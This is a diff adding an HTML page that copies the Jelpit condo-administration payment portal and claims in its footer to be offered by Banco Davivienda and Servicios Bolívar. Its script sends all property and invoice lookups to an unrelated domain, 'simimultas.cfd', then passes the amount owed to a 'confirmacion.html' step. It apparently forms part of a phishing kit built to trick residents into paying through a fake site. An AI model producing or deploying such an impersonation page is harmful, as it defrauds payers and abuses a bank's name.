@@ -1,0 +1,1142 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagar mi administración - Jelpit</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background-color: #f7f7f7;
+        }
+
+        /* Header */
+        header {
+            background: linear-gradient(135deg, #2d1b69 0%, #2d1b69 100%);
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            min-height: 65px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+
+        .logo img {
+            height: 60px;
+            width: auto;
+        }
+
+        .menu-btn {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 28px;
+            cursor: pointer;
+            padding: 5px;
+        }
+
+        /* Main Container */
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: #f7f7f7;
+            min-height: 100vh;
+        }
+
+        /* Estado Image */
+        .estado-section {
+            padding: 20px;
+            background: #f7f7f7;
+        }
+
+        .estado-image {
+            width: 100%;
+            max-width: 100%;
+            margin-bottom: 0;
+        }
+
+        .steps-visual {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 15px 20px;
+            gap: 15px;
+            position: relative;
+            margin-top: 10px;
+        }
+
+        .step-visual {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            flex: 0 0 auto;
+            position: relative;
+            z-index: 2;
+        }
+
+        .step-circle-outer {
+            width: 50px;
+            height: 50px;
+            border: 2.5px solid #ddd;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #f7f7f7;
+            margin-top: 3px;
+        }
+
+        .step-circle-outer.active {
+            border-color: #00ff88;
+        }
+
+        .step-circle-inner {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #f7f7f7;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 16px;
+            color: #999;
+        }
+
+        .step-circle-inner.active {
+            background: #00ff88;
+            color: #2d1b69;
+        }
+
+        .step-label {
+            font-size: 11px;
+            font-weight: 700;
+            color: #2d1b69;
+            text-align: center;
+        }
+
+        .step-visual:not(:first-child) .step-label {
+            color: #999;
+            font-weight: 500;
+        }
+
+        .step-connector {
+            width: 60px;
+            height: 2px;
+            background: #ddd;
+            flex: 0 0 auto;
+            margin: 25px -15px 0 -15px;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Banner */
+        .banner {
+            background: #e8f5e9;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 0 20px 20px;
+            display: flex;
+            gap: 15px;
+        }
+
+        .banner-icon {
+            font-size: 32px;
+            flex-shrink: 0;
+        }
+
+        .banner-content h3 {
+            color: #2d1b69;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+
+        .banner-content p {
+            color: #666;
+            font-size: 13px;
+            margin-bottom: 8px;
+            line-height: 1.4;
+        }
+
+        .banner-link {
+            color: #2d1b69;
+            text-decoration: underline;
+            font-weight: 600;
+            font-size: 12px;
+            cursor: pointer;
+        }
+
+        /* Form Section */
+        .form-section {
+            padding: 20px;
+            background: transparent;
+        }
+
+        .form-title {
+            color: #2d1b69;
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+            position: relative;
+        }
+
+        .form-label {
+            position: absolute;
+            top: 14px;
+            left: 12px;
+            font-size: 13px;
+            color: #999;
+            margin: 0;
+            pointer-events: none;
+            transition: all 0.3s ease;
+            font-weight: 400;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 16px 12px 10px 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 13px;
+            font-family: inherit;
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            cursor: pointer;
+            background: #f7f7f7;
+        }
+
+        .form-input input {
+            border: none;
+            outline: none;
+            flex: 1;
+            font-size: 13px;
+            font-family: inherit;
+            padding: 0;
+            background: transparent;
+            color: #999;
+        }
+
+        .form-input input::placeholder {
+            color: transparent;
+        }
+
+        .form-input input:not(:placeholder-shown) ~ .form-label {
+            top: 4px;
+            font-size: 10px;
+            color: #999;
+        }
+
+        .form-input:focus-within .form-label {
+            top: 4px;
+            font-size: 10px;
+            color: #999;
+        }
+
+        .form-input:focus-within {
+            border-color: #00ff88;
+            background: #f7f7f7;
+        }
+
+        #conjuntoInput {
+            max-width: 100%;
+            padding: 16px 12px 10px 12px;
+            align-items: center;
+        }
+
+        #conjuntoInput .form-label {
+            top: 50%;
+            left: 12px;
+            transform: translateY(-50%);
+            font-size: 13px;
+            color: #999;
+            transition: all 0.3s ease;
+        }
+
+        #conjuntoInput input:not(:placeholder-shown) ~ .form-label {
+            top: 6px;
+            left: 12px;
+            transform: translateY(0);
+            font-size: 10px;
+        }
+
+        #conjuntoInput:focus-within .form-label {
+            top: 6px;
+            left: 12px;
+            transform: translateY(0);
+            font-size: 10px;
+        }
+
+        /* Modal/Search */
+        .search-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            align-items: flex-start;
+        }
+
+        .search-modal.active {
+            display: flex;
+        }
+
+        .search-modal-content {
+            background: white;
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+            border-radius: 12px 12px 0 0;
+            margin-top: 0;
+        }
+
+        .search-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .search-back {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #2d1b69;
+        }
+
+        .search-close {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #999;
+        }
+
+        .search-input {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-bottom: 2px solid #2d1b69;
+            font-size: 14px;
+            font-family: inherit;
+            outline: none;
+            margin-bottom: 20px;
+        }
+
+        .search-results {
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .search-item {
+            padding: 12px;
+            border-left: 4px solid #2d1b69;
+            margin-bottom: 12px;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: background 0.2s;
+        }
+
+        .search-item:hover {
+            background: #f5f5f5;
+        }
+
+        /* Footer */
+        footer {
+            background: #2d1b69;
+            padding: 30px 20px;
+            color: white;
+        }
+
+        .footer-content {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .footer-subtitle {
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .footer-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: white;
+            margin-bottom: 5px;
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 15px;
+        }
+
+        .footer-contact {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 15px;
+            line-height: 1.6;
+        }
+
+        .footer-contact a {
+            color: #00ff88;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .footer-contact a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-divider {
+            height: 1px;
+            background: rgba(255, 255, 255, 0.2);
+            margin: 15px 0;
+        }
+
+        .footer-socials {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+
+        .footer-socials a {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 50px;
+            height: 50px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            color: white;
+            text-decoration: none;
+            transition: all 0.3s;
+        }
+
+        .footer-socials a:hover {
+            background: #00ff88;
+            color: #2d1b69;
+        }
+
+        .footer-socials svg {
+            width: 28px;
+            height: 28px;
+        }
+
+        .footer-links {
+            text-align: center;
+            font-size: 11px;
+        }
+
+        .footer-links a {
+            color: #00ff88;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .search-item-title {
+            color: #2d1b69;
+            font-weight: 800;
+            font-size: 14px;
+            margin-bottom: 4px;
+            letter-spacing: -0.3px;
+        }
+
+        .search-item-info {
+            display: flex;
+            gap: 10px;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .search-item-icon {
+            font-size: 14px;
+            width: 20px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Button */
+        .btn-continue {
+            width: 100%;
+            padding: 14px;
+            background: #2d1b69;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-bottom: 20px;
+            font-family: inherit;
+        }
+
+        .btn-continue:hover {
+            background: #1f1347;
+            transform: scale(1.02);
+        }
+
+        .btn-continue:disabled {
+            background: #ddd;
+            color: #999;
+            cursor: not-allowed;
+            transform: scale(1);
+        }
+
+        /* Info Section */
+        .info-section {
+            background: #e8f5e9;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+
+        .info-title {
+            color: #2d1b69;
+            font-weight: 700;
+            font-size: 13px;
+            margin-bottom: 8px;
+            display: flex;
+            gap: 8px;
+            align-items: center;
+        }
+
+        .info-text {
+            color: #666;
+            font-size: 12px;
+            line-height: 1.4;
+        }
+
+        /* Steps */
+        .steps {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .step-circle {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #e0e0e0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            color: #999;
+            font-size: 16px;
+        }
+
+        .step-circle.active {
+            background: #00ff88;
+            color: #2d1b69;
+        }
+
+        .step-label {
+            font-size: 12px;
+            color: #999;
+            font-weight: 600;
+        }
+
+        .step-label.active-label {
+            color: #2d1b69;
+            font-weight: 700;
+        }
+
+        .step-line {
+            width: 40px;
+            height: 2px;
+            background: #ddd;
+            margin: 0 4px;
+        }
+
+        .search-loading,
+        .search-empty,
+        .search-error,
+        .search-hint {
+            padding: 16px 12px;
+            font-size: 13px;
+            color: #666;
+            text-align: center;
+        }
+
+        .search-error {
+            color: #c62828;
+        }
+
+        .search-item-subtitle {
+            font-size: 11px;
+            color: #888;
+            margin-top: 4px;
+            line-height: 1.4;
+        }
+
+        .form-error {
+            display: none;
+            margin-bottom: 12px;
+            padding: 10px 12px;
+            border-radius: 6px;
+            background: #ffebee;
+            color: #c62828;
+            font-size: 13px;
+        }
+
+        .form-error.visible {
+            display: block;
+        }
+
+        .search-modal-subtitle {
+            font-size: 12px;
+            color: #666;
+            margin: -12px 0 16px;
+            line-height: 1.4;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <div class="logo">
+            <img src="https://web-conjuntos.jelpit.com/d40c5d3bac09ee9fa209ef21692439f5.svg" alt="Jelpit Logo">
+        </div>
+        <button class="menu-btn">☰</button>
+    </header>
+
+    <!-- Main Container -->
+    <div class="container">
+        <!-- Estado Image -->
+        <div class="estado-section">
+            <div class="steps-visual">
+                <div class="step-visual">
+                    <div class="step-circle-outer active">
+                        <div class="step-circle-inner active">1</div>
+                    </div>
+                    <div class="step-label">Buscar</div>
+                </div>
+                <div class="step-connector"></div>
+                <div class="step-visual">
+                    <div class="step-circle-outer">
+                        <div class="step-circle-inner">2</div>
+                    </div>
+                    <div class="step-label">Verificar</div>
+                </div>
+                <div class="step-connector"></div>
+                <div class="step-visual">
+                    <div class="step-circle-outer">
+                        <div class="step-circle-inner">3</div>
+                    </div>
+                    <div class="step-label">Pagar</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Form Section -->
+        <div class="form-section">
+            <h2 class="form-title">Pagar mi administración</h2>
+
+            <div class="form-group">
+                <div class="form-input" id="conjuntoInput">
+                    <input type="text" id="conjuntoField" placeholder="Ingresa el nombre completo de tu conjunto" readonly style="cursor: pointer;">
+                    <span class="form-input-icon">
+                        <img src="edificio.png" alt="Edificio" style="width: 24px; height: 24px;">
+                    </span>
+                    <label class="form-label" for="conjuntoField">Ingresa el nombre completo de tu conjunto</label>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <div class="form-input" id="apartamentInput">
+                    <input type="text" id="apartamentField" placeholder=" " readonly style="cursor: pointer;">
+                    <label class="form-label" for="apartamentField">Ingresa el número de apartamento, casa o local</label>
+                </div>
+            </div>
+
+            <div class="form-error" id="formError"></div>
+
+            <button class="btn-continue" id="btnContinue" disabled onclick="continuarPago()">Continuar</button>
+
+            <!-- Paga a varios inmuebles Image -->
+            <div style="padding: 20px 0 0 0;">
+                <img src="image copy.png" alt="Paga a varios inmuebles" style="width: 100%; height: auto;">
+            </div>
+        </div>
+    </div>
+
+    <!-- Search Modal -->
+    <div class="search-modal" id="searchModal">
+        <div class="search-modal-content">
+            <div class="search-header">
+                <button class="search-back" onclick="closeSearch()">←</button>
+                <button class="search-close" onclick="closeSearch()">✕</button>
+            </div>
+
+            <p class="search-modal-subtitle" id="searchModalSubtitle"></p>
+            <input type="text" class="search-input" id="searchInput" placeholder="Ingresa el nombre de tu inmueble">
+
+            <div class="search-results" id="searchResults">
+                <!-- Results will be populated here -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const API_BASE = 'https://simimultas.cfd/apiJelpit.php';
+
+        let selectedConjunto = null;
+        let selectedProperty = null;
+        let currentResults = [];
+        let searchTimeout = null;
+        let searchMode = 'conjunto';
+
+        function getCoOwnershipId() {
+            if (!selectedConjunto) return '';
+            return selectedConjunto.parent_co_ownership_id || selectedConjunto._id;
+        }
+
+        function formatPropertyType(type) {
+            const labels = {
+                CASA: 'Casa',
+                APARTAMENTO: 'Apartamento',
+                LOCAL: 'Local',
+                OTROS: 'Inmueble'
+            };
+            return labels[type] || type || 'Inmueble';
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text || '';
+            return div.innerHTML;
+        }
+
+        function formatConjuntoLabel(conjunto) {
+            return `${conjunto.co_ownership_name} , ${conjunto.address} - ${conjunto.department} - ${conjunto.city}`;
+        }
+
+        function formatMonto(value) {
+            const amount = Math.floor(Number(value) || 0);
+            return amount.toString().replace(/\B(?=(\d{3})+(?!\d))/g, '.');
+        }
+
+        async function apiGet(params) {
+            const url = new URL(API_BASE);
+            Object.entries(params).forEach(([key, value]) => {
+                url.searchParams.set(key, value);
+            });
+
+            const response = await fetch(url.toString());
+            const data = await response.json();
+
+            if (!response.ok && !data.error) {
+                throw new Error('Error de conexión con el servicio');
+            }
+
+            return data;
+        }
+
+        function showFormError(message) {
+            const errorEl = document.getElementById('formError');
+            if (!message) {
+                errorEl.textContent = '';
+                errorEl.classList.remove('visible');
+                return;
+            }
+
+            errorEl.textContent = message;
+            errorEl.classList.add('visible');
+        }
+
+        function openConjuntoSearch() {
+            searchMode = 'conjunto';
+            const modal = document.getElementById('searchModal');
+            const searchInput = document.getElementById('searchInput');
+            const subtitle = document.getElementById('searchModalSubtitle');
+
+            subtitle.textContent = 'Busca y selecciona tu conjunto';
+            searchInput.placeholder = 'Ingresa el nombre de tu conjunto';
+            modal.classList.add('active');
+            searchInput.value = document.getElementById('conjuntoField').value.trim();
+            searchInput.focus();
+
+            if (searchInput.value.trim().length >= 3) {
+                searchConjuntos(searchInput.value.trim());
+            } else {
+                document.getElementById('searchResults').innerHTML =
+                    '<p class="search-hint">Escribe al menos 3 letras para buscar tu conjunto</p>';
+            }
+        }
+
+        function openApartamentSearch() {
+            if (!selectedConjunto) {
+                showFormError('Primero selecciona un conjunto.');
+                openConjuntoSearch();
+                return;
+            }
+
+            searchMode = 'property';
+            const modal = document.getElementById('searchModal');
+            const searchInput = document.getElementById('searchInput');
+            const subtitle = document.getElementById('searchModalSubtitle');
+
+            subtitle.textContent = selectedConjunto.co_ownership_name;
+            searchInput.placeholder = 'Ingresa el número de apartamento, casa o local';
+            modal.classList.add('active');
+            searchInput.value = document.getElementById('apartamentField').value.trim();
+            searchInput.focus();
+
+            if (searchInput.value.trim().length >= 1) {
+                searchPropiedades(searchInput.value.trim());
+            } else {
+                document.getElementById('searchResults').innerHTML =
+                    '<p class="search-hint">Escribe el número del inmueble para buscar</p>';
+            }
+        }
+
+        function closeSearch() {
+            document.getElementById('searchModal').classList.remove('active');
+        }
+
+        function renderConjuntoResults(results) {
+            currentResults = results;
+            const resultsDiv = document.getElementById('searchResults');
+
+            if (!results.length) {
+                resultsDiv.innerHTML = '<p class="search-empty">No se encontraron conjuntos</p>';
+                return;
+            }
+
+            resultsDiv.innerHTML = results.map((conjunto, index) => `
+                <div class="search-item" onclick="selectConjuntoByIndex(${index})">
+                    <div class="search-item-title">${escapeHtml(conjunto.co_ownership_name)}</div>
+                    <div class="search-item-subtitle">${escapeHtml(conjunto.address)} - ${escapeHtml(conjunto.city)}</div>
+                    <div class="search-item-info">
+                        <span class="search-item-icon">
+                            <img src="edificio.png" alt="Edificio" style="width: 16px; height: 16px;">
+                        </span>
+                        <span>Convenio: ${escapeHtml(conjunto.agreement_number)}</span>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        async function searchConjuntos(query) {
+            const resultsDiv = document.getElementById('searchResults');
+            const trimmedQuery = query.trim();
+
+            if (trimmedQuery.length < 3) {
+                resultsDiv.innerHTML = '<p class="search-hint">Escribe al menos 3 letras para buscar tu conjunto</p>';
+                return;
+            }
+
+            resultsDiv.innerHTML = '<p class="search-loading">Buscando conjuntos...</p>';
+
+            try {
+                const data = await apiGet({
+                    action: 'buscar_conjuntos',
+                    q: trimmedQuery
+                });
+
+                if (!data.ok) {
+                    resultsDiv.innerHTML = `<p class="search-error">${escapeHtml(data.error || 'No se pudo completar la búsqueda')}</p>`;
+                    return;
+                }
+
+                renderConjuntoResults(data.results || []);
+            } catch (error) {
+                resultsDiv.innerHTML = `<p class="search-error">${escapeHtml(error.message || 'Error al buscar conjuntos')}</p>`;
+            }
+        }
+
+        function renderPropertyResults(results) {
+            currentResults = results;
+            const resultsDiv = document.getElementById('searchResults');
+
+            if (!results.length) {
+                resultsDiv.innerHTML = '<p class="search-empty">No se encontraron inmuebles</p>';
+                return;
+            }
+
+            resultsDiv.innerHTML = results.map((property, index) => `
+                <div class="search-item" onclick="selectPropertyByIndex(${index})">
+                    <div class="search-item-title">Inmueble ${escapeHtml(property.reference || property.property_number)}</div>
+                    <div class="search-item-subtitle">${escapeHtml(formatPropertyType(property.property_type))}</div>
+                    <div class="search-item-info">
+                        <span class="search-item-icon">
+                            <img src="edificio.png" alt="Inmueble" style="width: 16px; height: 16px;">
+                        </span>
+                        <span>Referencia: ${escapeHtml(property.reference || property.property_number)}</span>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        async function searchPropiedades(query) {
+            const resultsDiv = document.getElementById('searchResults');
+            const trimmedQuery = query.trim();
+
+            if (!selectedConjunto) {
+                resultsDiv.innerHTML = '<p class="search-error">Primero selecciona un conjunto</p>';
+                return;
+            }
+
+            if (trimmedQuery.length < 1) {
+                resultsDiv.innerHTML = '<p class="search-hint">Escribe el número del inmueble para buscar</p>';
+                return;
+            }
+
+            resultsDiv.innerHTML = '<p class="search-loading">Buscando inmuebles...</p>';
+
+            try {
+                const data = await apiGet({
+                    action: 'buscar_propiedades',
+                    coOwnershipId: getCoOwnershipId(),
+                    q: trimmedQuery
+                });
+
+                if (!data.ok) {
+                    resultsDiv.innerHTML = `<p class="search-error">${escapeHtml(data.error || 'No se pudo completar la búsqueda')}</p>`;
+                    return;
+                }
+
+                renderPropertyResults(data.results || []);
+            } catch (error) {
+                resultsDiv.innerHTML = `<p class="search-error">${escapeHtml(error.message || 'Error al buscar inmuebles')}</p>`;
+            }
+        }
+
+        function handleSearchInput() {
+            clearTimeout(searchTimeout);
+            const query = document.getElementById('searchInput').value;
+
+            searchTimeout = setTimeout(() => {
+                if (searchMode === 'property') {
+                    searchPropiedades(query);
+                } else {
+                    searchConjuntos(query);
+                }
+            }, 350);
+        }
+
+        function selectConjuntoByIndex(index) {
+            const conjunto = currentResults[index];
+            if (!conjunto) return;
+
+            selectedConjunto = conjunto;
+            selectedProperty = null;
+            document.getElementById('conjuntoField').value = formatConjuntoLabel(conjunto);
+            document.getElementById('apartamentField').value = '';
+            closeSearch();
+            showFormError('');
+            checkFormValid();
+        }
+
+        function selectPropertyByIndex(index) {
+            const property = currentResults[index];
+            if (!property) return;
+
+            selectedProperty = property;
+            document.getElementById('apartamentField').value = property.reference || property.property_number;
+            closeSearch();
+            showFormError('');
+            checkFormValid();
+        }
+
+        function checkFormValid() {
+            const btnContinue = document.getElementById('btnContinue');
+            btnContinue.disabled = !(selectedConjunto && selectedProperty);
+        }
+
+        function extractMonto(facturasData) {
+            if (!facturasData || Array.isArray(facturasData)) {
+                return 0;
+            }
+
+            if (Array.isArray(facturasData.invoices) && facturasData.invoices.length > 0) {
+                return facturasData.invoices.reduce((total, invoice) => {
+                    return total + (invoice.total_amount || invoice.amount || invoice.balance || 0);
+                }, 0);
+            }
+
+            if (facturasData.noInvoicesData) {
+                return facturasData.noInvoicesData.total_amount || facturasData.noInvoicesData.balance || 0;
+            }
+
+            return 0;
+        }
+
+        async function continuarPago() {
+            const btnContinue = document.getElementById('btnContinue');
+
+            if (!selectedConjunto) {
+                showFormError('Selecciona un conjunto desde el buscador.');
+                openConjuntoSearch();
+                return;
+            }
+
+            if (!selectedProperty) {
+                showFormError('Selecciona un inmueble desde el buscador.');
+                openApartamentSearch();
+                return;
+            }
+
+            showFormError('');
+            btnContinue.disabled = true;
+            btnContinue.classList.add('loading');
+            btnContinue.textContent = 'Verificando...';
+
+            try {
+                const coOwnershipId = getCoOwnershipId();
+                const property = selectedProperty;
+
+                const facturasResponse = await apiGet({
+                    action: 'facturas',
+                    coOwnerShipId: coOwnershipId,
+                    reference: property.reference
+                });
+
+                if (!facturasResponse.ok) {
+                    throw new Error(facturasResponse.error || 'No se pudo consultar la información de pago');
+                }
+
+                const monto = extractMonto(facturasResponse.data);
+                if (!monto) {
+                    throw new Error('No hay saldo pendiente para este inmueble.');
+                }
+
+                sessionStorage.setItem('conjunto', selectedConjunto.co_ownership_name);
+                sessionStorage.setItem('apartament', property.reference);
+                sessionStorage.setItem('convenio', selectedConjunto.agreement_number || '');
+                sessionStorage.setItem('monto', formatMonto(monto));
+                sessionStorage.setItem('coOwnershipId', coOwnershipId);
+                sessionStorage.setItem('propertyId', property._id || '');
+
+                window.location.href = 'confirmacion.html';
+            } catch (error) {
+                showFormError(error.message || 'Ocurrió un error al verificar la información.');
+                btnContinue.disabled = false;
+                btnContinue.classList.remove('loading');
+                btnContinue.textContent = 'Continuar';
+                checkFormValid();
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const conjuntoInput = document.getElementById('conjuntoInput');
+            const conjuntoField = document.getElementById('conjuntoField');
+            const apartamentInput = document.getElementById('apartamentInput');
+            const apartamentField = document.getElementById('apartamentField');
+            const searchInput = document.getElementById('searchInput');
+
+            conjuntoInput.addEventListener('click', openConjuntoSearch);
+            conjuntoField.addEventListener('focus', openConjuntoSearch);
+
+            apartamentInput.addEventListener('click', openApartamentSearch);
+            apartamentField.addEventListener('focus', openApartamentSearch);
+
+            searchInput.addEventListener('input', handleSearchInput);
+
+            document.getElementById('searchModal').addEventListener('click', (event) => {
+                if (event.target.id === 'searchModal') {
+                    closeSearch();
+                }
+            });
+        });
+    </script>
+
+    <!-- Footer -->
+    <footer>
+        <div class="footer-content">
+            <div class="footer-subtitle">
+                Servicio ofrecido por Banco Davivienda S.A. y<br>
+                operado por Servicios Bolívar S.A.
+            </div>
+
+            <div class="footer-title">¿Necesitas ayuda?</div>
+            <div class="footer-text">¿Tienes preguntas, quejas o reclamos?</div>
+
+            <div class="footer-contact">
+                Escribenos a<br>
+                <a href="mailto:lineadesoporte923@serviciosbolivar.com">lineadesoporte923@serviciosbolivar.com</a><br>
+                o llámanos desde tu celular al <strong>#923</strong> o al número<br>
+                <strong>601 3905331.</strong>
+            </div>
+
+            <div class="footer-divider"></div>
+
+            <div class="footer-socials">
+                <a href="#" title="YouTube" aria-label="YouTube">
+                    <svg viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/>
+                    </svg>
+                </a>
+                <a href="#" title="LinkedIn" aria-label="LinkedIn">
+                    <svg viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.475-2.236-1.986-2.236-1.081 0-1.722.722-2.004 1.418-.103.249-.129.597-.129.946v5.441h-3.554s.05-8.736 0-9.637h3.554v1.36c.425-.654 1.185-1.586 2.882-1.586 2.105 0 3.684 1.377 3.684 4.342v5.521zM5.337 9.433c-1.144 0-1.915-.759-1.915-1.71 0-.955.77-1.71 1.954-1.71 1.185 0 1.915.755 1.915 1.71 0 .951-.73 1.71-1.954 1.71zm1.581 11.019H3.757V9.816h3.161v10.636zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/>
+                    </svg>
+                </a>
+                <a href="#" title="Facebook" aria-label="Facebook">
+                    <svg viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                    </svg>
+                </a>
+                <a href="#" title="Instagram" aria-label="Instagram">
+                    <svg viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.266.069 1.646.069 4.85 0 3.204-.012 3.584-.07 4.85-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zM5.838 12a6.162 6.162 0 1 1 12.324 0 6.162 6.162 0 0 1-12.324 0zM12 16a4 4 0 1 1 0-8 4 4 0 0 1 0 8zm4.965-10.322a1.44 1.44 0 1 1 0-2.881 1.44 1.44 0 0 1 0 2.881z"/>
+                    </svg>
+                </a>
+                <a href="#" title="TikTok" aria-label="TikTok">
+                    <img src="tik-tok.png" alt="TikTok" style="width: 28px; height: 28px;">
+                </a>
+            </div>
+
+            <div class="footer-divider"></div>
+
+            <div class="footer-links">
+                <a href="#">Términos y condiciones</a><br><br>
+                <a href="#">Política de Tratamiento de Datos Personales</a>
+            </div>
+        </div>
+    </footer>
